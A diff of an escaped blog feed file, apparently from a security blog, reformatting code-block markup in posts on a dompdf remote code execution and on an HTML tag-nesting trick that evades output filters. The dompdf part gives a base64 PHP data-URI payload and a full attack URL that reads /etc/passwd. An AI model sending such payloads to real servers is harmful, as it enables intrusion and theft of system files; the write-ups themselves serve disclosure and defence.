-&lt;span class=&quot;x&quot;&gt;&lt;/em&gt; @var bool&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;/**&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;* Enable inline PHP&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;* If this setting is set to true then DOMPDF will automatically evaluate&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;* inline PHP contained within &amp;lt;script type=&amp;quot;text/php&amp;quot;&amp;gt; ... &amp;lt;/script&amp;gt; tags.&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;* Attention!&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;* Enabling this for documents you do not trust (e.g. arbitrary remote html&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;* pages) is a security risk. Inline scripts are run with the same level of&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;* system access available to dompdf. Set this option to false (recommended)&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;* if you wish to process untrusted documents.&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;* @var bool&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt;*/&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;def(&amp;quot;DOMPDF_ENABLE_PHP&amp;quot;, false);&lt;/span&gt;&lt;/p&gt;
+&lt;span class=&quot;x&quot;&gt;def(&amp;quot;DOMPDF_ENABLE_PHP&amp;quot;, false);&lt;/span&gt;
 
-&lt;p&gt;&lt;span class=&quot;x&quot;&gt;/&lt;em&gt;&lt;em&gt;&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;/**&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt; * Enable remote file access&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt; &lt;/em&gt;&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt; *&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt; * If this setting is set to true, DOMPDF will access remote sites for&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt; * images and CSS files as required.&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt; * This is required for part of test case www/test/image_variants.html through www/examples.php&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt; &lt;/em&gt;&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt; *&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt; * Attention!&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt; * This can be a security risk, in particular in combination with DOMPDF_ENABLE_PHP and&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt; * allowing remote access to dompdf.php or on allowing remote html code to be passed to&lt;/span&gt;
@@ -924,10 +1333,11 @@ from the config file:&lt;/p&gt;
 &lt;span class=&quot;x&quot;&gt; * This allows anonymous users to download legally doubtful internet content which on&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt; * tracing back appears to being downloaded by your server, or allows malicious php code&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt; * in remote html pages to be executed by your server with your account privileges.&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt; &lt;em&gt;&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt; *&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt; * @var bool&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt; &lt;/em&gt;/&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;def(&amp;quot;DOMPDF_ENABLE_REMOTE&amp;quot;, false);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;span class=&quot;x&quot;&gt; */&lt;/span&gt;
+&lt;span class=&quot;x&quot;&gt;def(&amp;quot;DOMPDF_ENABLE_REMOTE&amp;quot;, false);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;Reading that I wonder &lt;strong&gt;why people would activate these settings&lt;/strong&gt; ? In fact the
 &lt;em&gt;&lt;code&gt;enable_remote&lt;/code&gt;&lt;/em&gt; is the easiest way to have images in your PDF, if you have
@@ -951,7 +1361,8 @@ PDF by giving the full encoded image as a data uri parameter.&lt;/p&gt;
 
 &lt;p&gt;The old trick for dompdf images was using HTML sources in this form:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;data:image/jpeg;base64,HERE_SOME_BASE64_ENCODED_BINARY_THINGS&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;data:image/jpeg;base64,HERE_SOME_BASE64_ENCODED_BINARY_THINGS&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;Using &lt;strong&gt;data&lt;/strong&gt; to embed images in the PDF is a nice hack, if you have never seen a
 data-uri image check github&#39;s 404 pages HTML sources.&lt;/p&gt;
@@ -962,24 +1373,28 @@ mime type &lt;code&gt;application/x-httpd-php&lt;/code&gt; (you could also try X
 
 &lt;p&gt;Let&#39;s say I have this small PHP script:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;PHP RCE : &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;phpversion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;bye&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;Note that I could do some other things in PHP, that&#39;s just an example.&lt;/p&gt;
 
 &lt;p&gt;In a data URI source this same PHP script content can be written like that (base64 encoding is just a way of rewritting something in ascii-7):&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;data:application/x-httpd-php;charset=utf-8;base64,PD9waHANCmVjaG8gJ1BIUCBSQ0UgOiAnIC4gcGhwdmVyc2lvbigpOw0KZWNobyAiYnllIjsNCj8+&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;data:application/x-httpd-php;charset=utf-8;base64,PD9waHANCmVjaG8gJ1BIUCBSQ0UgOiAnIC4gcGhwdmVyc2lvbigpOw0KZWNobyAiYnllIjsNCj8+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;With some url encoding (because we&#39;ll use that on an url) that is:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;data%3Aapplication%2Fx-httpd-php%3Bcharset%3Dutf-8%3Bbase64%2CPD9waHANCmVjaG8gJ1BIUCBSQ0UgOiAnIC4gcGhwdmVyc2lvbigpOw0KZWNobyAiYnllIjsNCj8%2B&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;data%3Aapplication%2Fx-httpd-php%3Bcharset%3Dutf-8%3Bbase64%2CPD9waHANCmVjaG8gJ1BIUCBSQ0UgOiAnIC4gcGhwdmVyc2lvbigpOw0KZWNobyAiYnllIjsNCj8%2B&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;And the final attack is:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;/&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;/dompdf/dompdf.php?base_path=&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;options[Attachment]=0&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;input_file=data%3Aapplication%2Fx-httpd-php%3Bcharset%3Dutf-8%3Bbase64%2CPD9waHANCmluY2x1ZGUgKCcvZXRjL3Bhc3N3ZCcpOw0KZWNobyAiYnllIjsNCj8%2B&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;/&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;/dompdf/dompdf.php?base_path=&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;options[Attachment]=0&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;input_file=data%3Aapplication%2Fx-httpd-php%3Bcharset%3Dutf-8%3Bbase64%2CPD9waHANCmluY2x1ZGUgKCcvZXRjL3Bhc3N3ZCcpOw0KZWNobyAiYnllIjsNCj8%2B&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;If default settings for &lt;code&gt;DOMPDF_ENABLE_PHP&lt;/code&gt; and &lt;code&gt;DOMPDF_ENABLE_REMOTE&lt;/code&gt; are
 altered (to true) this attack will successfully run the PHP script and render
@@ -1010,7 +1425,7 @@ web document root.&lt;/li&gt;
 
 </description>
 				<published>2016-12-19 00:00:00 +0100</published>
-				<link>http://regilero.github.io/security/english/2016/12/19/security_dompdf_rce/</link>
+				<link>http://regilero.github.io/english/security/2016/12/19/security_dompdf_rce/</link>
 			</item>
 		
 			<item>
@@ -1074,27 +1489,29 @@ page clearly forgot to close some tags.&lt;/p&gt;
 
 &lt;p&gt;So this:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- initial --&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- initial --&amp;gt;&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;foo
         &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;bar
       &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;Is automatically rewritten with closing &lt;code&gt;&amp;lt;/LI&amp;gt;&lt;/code&gt;:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- rendered --&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- rendered --&amp;gt;&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;foo&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;LI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;LI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;But let&#39;s look at something nastier, we have an opening &lt;code&gt;&amp;lt;DIV&amp;gt;&lt;/code&gt; inside the &lt;code&gt;&amp;lt;LI&amp;gt;&lt;/code&gt;:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- initial --&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- initial --&amp;gt;&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;foo
@@ -1103,11 +1520,12 @@ page clearly forgot to close some tags.&lt;/p&gt;
         &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;The browser will add the closing DIV:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- rendered --&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- rendered --&amp;gt;&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;foo
@@ -1117,7 +1535,8 @@ page clearly forgot to close some tags.&lt;/p&gt;
         &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;Chances are that a &lt;strong&gt;server side output filter&lt;/strong&gt;, filtering HTML contributions
 would have &lt;strong&gt;detected&lt;/strong&gt; this HTML as invalid, if you &lt;strong&gt;count opening and closing
@@ -1125,7 +1544,7 @@ tags&lt;/strong&gt; you can detect that a closing tag is missing.&lt;/p&gt;
 
 &lt;p&gt;So our bad contributor will instead write this:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- initial --&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- initial --&amp;gt;&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;foo&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;third&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;test&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
@@ -1133,7 +1552,8 @@ tags&lt;/strong&gt; you can detect that a closing tag is missing.&lt;/p&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end third --&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end second --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;And &lt;strong&gt;if you count&lt;/strong&gt; the number of closing and opening tags, or if you try to
 cleanup this with some regexp (are you crazy?), chances are that this will look
@@ -1141,7 +1561,7 @@ good.&lt;/p&gt;
 
 &lt;p&gt;And now the browser result:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- rendered --&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- rendered --&amp;gt;&lt;/span&gt;
